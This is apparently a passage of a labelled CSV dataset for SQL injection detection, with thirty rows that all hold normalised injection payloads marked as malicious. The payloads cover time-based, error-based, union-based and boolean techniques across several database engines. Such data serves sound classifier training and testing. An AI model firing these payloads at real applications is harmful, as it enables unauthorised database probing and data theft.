row_index,payload_norm,label,sqli_type_hint
10350,1' ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( 'glfq' like 'glfq,1,
10351,"-8353' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( 'ptlz' = 'ptlz",1,
10352,"1%"" ) ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
10353,-2817%' ) or 8255 = 3841--,1,
10354,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--",1,
10355,"iif ( 7036 = 2370,1,1/0 )",1,
10356,select sleep ( 5 ) and ( 'pwpc' = 'pwpc,1,
10357,"-6457 where 1764 = 1764 union all select 1764,1764,1764,1764,1764,1764,1764,1764--",1,
10358,"-5054%"" ) ) ) union all select 8263,8263,8263,8263--",1,
10359,"1%"" ) ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( ""%"" = """,1,
10360,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( 'fwok' like 'fwok",1,
10361,"-7395%"" order by 1--",1,
10362,"1"" where 9241 = 9241 union all select null#",1,
10363,"1"" where 8483 = 8483 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
10364,"1'+ ( select 'sacd' where 5984 = 5984 union all select null,null,null,null,null,null,null#",1,
10365,"1' ) where 6248 = 6248 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",1,
10366,"1"" ) ) as fmul where 7827 = 7827",1,
10367,"-8258"" ) ) as swjp where 2681 = 2681 union all select 2681,2681,2681,2681,2681,2681--",1,
10368,-4518 where 8023 = 8023 or 6872 = 6872--,1,
10369,"1' ) as gxpb where 7107 = 7107 or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) --",1,
10370,"-8355%"" ) ) ) union all select 3004,3004,3004,3004,3004,3004,3004--",1,
10371,"1'+ ( select tnch where 1867 = 1867 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) +'",1,
10372,"-3924'|| ( select 'ssld' from dual where 6229 = 6229 union all select 6229,6229,6229,6229,6229#",1,
10373,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and 'fgcg' = 'fgcg",1,
10374,"-5830 ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",1,
10375,"1"" ) ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ( ""azmf"" = ""azmf",1,
10376,"1%' ) or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
10377,"1"" ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ""xhqc"" = ""xhqc",1,
10378,"1' ) ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ( 'rbhe' = 'rbhe",1,
10379,1' ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ),1,
